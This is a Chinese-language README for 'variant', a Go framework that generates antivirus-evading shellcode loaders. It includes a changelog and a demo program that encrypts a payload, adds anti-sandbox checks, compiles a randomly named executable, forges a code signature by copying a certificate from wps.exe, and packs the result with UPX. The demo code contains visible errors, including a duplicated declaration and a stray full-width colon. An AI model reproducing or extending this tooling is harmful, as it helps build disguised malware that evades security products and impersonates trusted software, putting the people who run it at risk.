# variant

Go Anti-Virus Framework

## Description

本项目会不断添加各种免杀的技术，但是**不适合直接不做任何修改的编译和使用**，即使是有随机特征的编译

### 特别说明

1. 本项目不会有 `GUI` 版本
2. 学习Go免杀的代码集合，顺手做了模块化处理，**实际开发未结束，还在持续更新**；
3. 想要实现最好的免杀效果还需要自行修改渲染编译模板，代码提供了三种加载方式的渲染模板。

### 更新日志

### 2024.2.4

1. 新增动态获取解密数据的模块 - `Dynamic: payload, key, iv`
2. 按照本地、远程、参数加载的方式重构，减少模板渲染的复杂度
3. 新增分离加载模块
4. 渲染模板优化

### 2024.1.30

1. `lzw`压缩导致熵值上升到`7.0+`；测试`fmt.Printf("Hello World")`编译后熵值在`6.0-6.1`之间，压缩模块下次一定
2. 远程加载：模块、模板、配置更新
3. 重构加密模块，利用反射根据传入的方法签名判断加密
4. 使用`windows package`重写了`DLL`调用模块，[`syscall`&`windows`的总结](https://c1ph3rx13.github.io/posts/2024-01-30/The-low-level-Operating-System-Primitives/)
5. 模板新增根据自定义导入对应库设置
6. 新增多个多重加密/编码方法，`Base32/62`编码测试熵值比较低

### 2024.1.29

1. 新增渲染判断，模板可根据结构体来渲染
2. 更改为验证为沙箱之后程序正常退出
3. 新增代码检查：检查通过再编译；初始化：`go install golang.org/x/tools/cmd/goimports@latest`
4. 细化结构体：根据功能区分
5. 新增压缩算法：`lzw`, `zstd`；熵值模块
6. 新增动态方法：`GetSelfSHA256Nth`
7. 优化代码逻辑

### 2024.1.27

1. 模块化配置
2. 模板渲染
3. 编译控制
4. UPX压缩：需要检查`upx.exe`是否正确放置在`build`文件夹，才能正确初始化
5. 签名伪造
6. 添加图标文件信息：初始化：`go install github.com/tc-hib/go-winres@latest`
7. 模板更新
8. 反沙箱模块

### TODO

1. 动态`key` 
2. 熵控制
3. 隐藏导入表

## Tmpl Struct

```go
type Data struct {
	CipherText string      // 保存加密文本的变量名
	PlainText  string      // 保存解密文本的变量名
	Payload    string      // 加密 shellcode
	Decrypt    string      // 解密方法
	Loader     string      // loader
	SandBox    interface{} // 反沙箱模块
	Local      interface{} // 本地加载模块
	Remote     interface{} // 远程加载模块
	Args       interface{} // 参数加载模块
	Compressor interface{} // 压缩算法模块
	Apart      interface{} // 分离加载模块
	Dynamic    interface{} // 动态数据
}
```

## Demo

```go
package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
    // 反沙箱模块
	sandbox := render.SandBox{
		Methods: []string{
			"sandbox.BootTime()",
			"sandbox.GetDesktopFiles()",
		}}
    
    // 动态数据
    dy := render.Dynamic{
		Import:        "variant/dynamic",
		DynamicUrl:    "https://www.baidu.com/favicon.ico",
		DynamicMethod: "dynamic.GetIcoHex",
		DynamicKey:    rand.RStrings(),
		KeyStart:      0,
		KeyEnd:        8,
		DynamicIV:     rand.RStrings(),
		IVStart:       10,
		IVEnd:         18,
	}
	
    // 本地加载
	local := render.Local{
		KeyName:  rand.RStrings(),
		KeyValue: rand.LStrings(16),
		IvName:   rand.RStrings(),
		IvValue:  rand.LStrings(16),
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorSm4HexBase85Decrypt",
		Loader:     "UuidFromString",
		Local:      local,
        Dynamic：   dy,
        SandBox:    sandbox,
	}
    
	// 定义模板渲染数据
	data := render.Data{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorSm4HexBase85Decrypt",
		Loader:     "HalosGate",
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		//Key: []byte(local.KeyValue),
		Key: dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
		//IV:  []byte(local.IvValue),
		IV:  dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
	}
	// 加密之后的 shellcode
	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}
	data.Payload = tmp

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
	}
	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	err = cOpts.Winres()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	sOpts := build.SignOpts{
		SignPath: "output",
		UnSign:   cOpts.ExeFileName,
		Signed:   "signed_" + cOpts.ExeFileName,
		Cert:     "wps.der",
		Thief:    "wps.exe",
		DstCert:  "wps.der",
	}

	// 保存证书
	err = sOpts.SaveCert()
	if err != nil {
		log.Fatal(err)
	}

	// 利用EXE进行签名伪造
	err = sOpts.ExeThief()
	if err != nil {
		log.Fatal(err)
	}

	// 利用证书进行签名伪造
	err = sOpts.CertThief()
	if err != nil {
		log.Fatal(err)
	}

	// 压缩参数
	upx := build.UpxOpts{
		Level:   "-9",
		Keep:    true,
		Force:   true,
		SrcExe:  cOpts.ExeFileName,
		UpxPath: "output",
	}

	// 压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Warn(err)
	}

}
```

### Thanks

https://github.com/Ne0nd0g/go-shellcode

https://github.com/safe6Sec/GolangBypassAV

https://github.com/afwu/GoBypass

https://github.com/piiperxyz/AniYa

https://github.com/wumansgy/goEncrypt

https://github.com/TideSec/GoBypassAV

https://github.com/Pizz33/GobypassAV-shellcode

https://github.com/timwhitez/Doge-Gabh
